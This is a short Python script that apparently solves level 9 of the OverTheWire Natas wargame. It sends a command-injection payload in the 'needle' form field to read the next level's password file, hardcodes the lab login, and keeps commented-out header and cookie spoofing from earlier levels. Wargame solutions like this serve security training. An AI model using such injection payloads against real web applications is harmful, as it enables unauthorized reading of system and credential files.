#!/usr/bin/env python

import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username

#response = requests.get(url, auth = (username, password), headers = headers)
session = requests.Session()

response = session.post(url , data = {"needle":". cat /etc/natas_webpass/natas10 #", "submit":"submit"}, auth = (username, password) )
#response = session.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit":"submit"}, auth = (username, password) )
content = response.text

#print session.cookies['loggedin']
#print content
 
print re.findall('/etc/natas_webpass/natas10:(.*)', content)[0]